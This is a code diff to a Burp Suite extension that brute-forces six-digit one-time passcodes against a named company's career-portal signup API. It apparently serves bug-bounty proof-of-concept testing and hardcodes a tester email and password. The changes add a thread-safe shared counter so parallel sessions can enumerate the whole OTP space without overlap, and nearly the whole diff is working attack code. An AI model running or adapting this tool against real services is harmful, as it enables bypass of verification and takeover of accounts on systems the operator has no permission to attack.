@@ -38,7 +38,7 @@ class BurpExtender(IBurpExtender, IHttpListener, IContextMenuFactory, IMenuItemH
         self.otp_start = 0
         self.otp_end = 999999
         self.email = "az3m+admin@bugcrowdninja.com"
-        self.password = "Attackeroass@321"
+        self.password = "Attackeroass@poc2"
         self.domain = "amdocs.com"
         self.is_running = False
         self.sessions = []  # Store multiple sessions
@@ -50,6 +50,8 @@ class BurpExtender(IBurpExtender, IHttpListener, IContextMenuFactory, IMenuItemH
         self.verbose_logging = False  # Set to True for detailed logs
         self.is_paused = False  # Pause flag
         self.repeat_count = 1  # Number of times to repeat the sequence
+        self.otp_counter_lock = threading.Lock()  # Lock for thread-safe OTP counter
+        self.global_otp_counter = self.otp_start  # Global OTP counter shared across threads
         
         # Full referer URL
         self.referer = "https://jobs.amdocs.com/candidate/login?domain=amdocs.com&trackApplicationStatus=false&hl=en&next=http%3A%2F%2Fjobs.amdocs.com%2Fcareerhub%2Fme%3Faction%3Dedit%26trackApplicationStatus%3Dfalse%26hl%3Den%26profile_type%3Dcandidate%26domain%3Damdocs.com%26customredirect%3D1"
@@ -172,6 +174,8 @@ class BurpExtender(IBurpExtender, IHttpListener, IContextMenuFactory, IMenuItemH
                 
                 self.is_running = True
                 self.is_paused = False
+                # Reset global OTP counter
+                self.global_otp_counter = self.otp_start
                 self.startButton.setText("Stop")
                 self.pauseButton.setEnabled(True)
                 self.statusLabel.setText("Status: Running (Repeat: " + str(self.repeat_count) + "x, Threads: " + str(self.num_threads) + ")")
@@ -213,6 +217,16 @@ class BurpExtender(IBurpExtender, IHttpListener, IContextMenuFactory, IMenuItemH
     def get_current_timestamp(self):
         """Generate current timestamp for X-Browser-Request-Time"""
         return str(time.time())
+
+    def get_next_otps(self, count):
+        """Thread-safe method to get next OTP codes"""
+        with self.otp_counter_lock:
+            otps = []
+            for i in range(count):
+                otp_code = self.global_otp_counter
+                otps.append(otp_code)
+                self.global_otp_counter += 1
+            return otps
 
     def extract_cookies_from_response(self, response):
         """Extract all cookies from Set-Cookie headers"""
@@ -711,7 +725,7 @@ class BurpExtender(IBurpExtender, IHttpListener, IContextMenuFactory, IMenuItemH
             self.log("Error in flow " + str(flow_id) + ": " + str(e), force=True)
             return None
 
-    def send_otp_confirmations_for_flow(self, flow_data, otp_start_code):
+    def send_otp_confirmations_for_flow(self, flow_data, otp_codes):
         """Send Step 5 (OTP confirmations) for a flow using stored cookies/CSRF"""
         flow_id = flow_data["flow_id"]
         flow_cookies = flow_data["cookies"]
@@ -720,11 +734,10 @@ class BurpExtender(IBurpExtender, IHttpListener, IContextMenuFactory, IMenuItemH
         try:
             self.log("=== Flow " + str(flow_id) + ": Sending OTP confirmations ===", force=True)
             
-            for otp_attempt in range(self.otps_per_session):
+            for otp_attempt, otp_code in enumerate(otp_codes):
                 if not self.is_running:
                     break
                 self.wait_if_paused()
-                otp_code = otp_start_code + otp_attempt
                 otp_str = str(otp_code).zfill(6)
                 self.log("Flow " + str(flow_id) + " - Step 5 (" + str(otp_attempt + 1) + "/" + str(self.otps_per_session) + "): POST /api/career_signup/confirm_otp with OTP: " + otp_str, force=True)
                 
@@ -847,17 +860,17 @@ class BurpExtender(IBurpExtender, IHttpListener, IContextMenuFactory, IMenuItemH
             
             # Phase 2: Send OTP confirmations (Step 5) for each flow using stored cookies/CSRF
             self.log("=== Phase 2: Sending OTP confirmations for all flows ===", force=True)
-            otp_counter = self.otp_start
             for flow_data in flow_data_list:
                 if not self.is_running:
                     break
                 self.wait_if_paused()
                 
-                # Send OTP confirmations using this flow's cookies/CSRF
-                self.send_otp_confirmations_for_flow(flow_data, otp_counter)
+                # Get next OTPs thread-safely (ensures no duplicates across threads)
+                otp_codes = self.get_next_otps(self.otps_per_session)
                 
-                # Move to next batch of OTPs for next flow
-                otp_counter += self.otps_per_session
+                # Send OTP confirmations using this flow's cookies/CSRF
+                self.send_otp_confirmations_for_flow(flow_data, otp_codes)
+                
                 self.wait_if_paused()
                 time.sleep(self.delay_between_sessions)
             
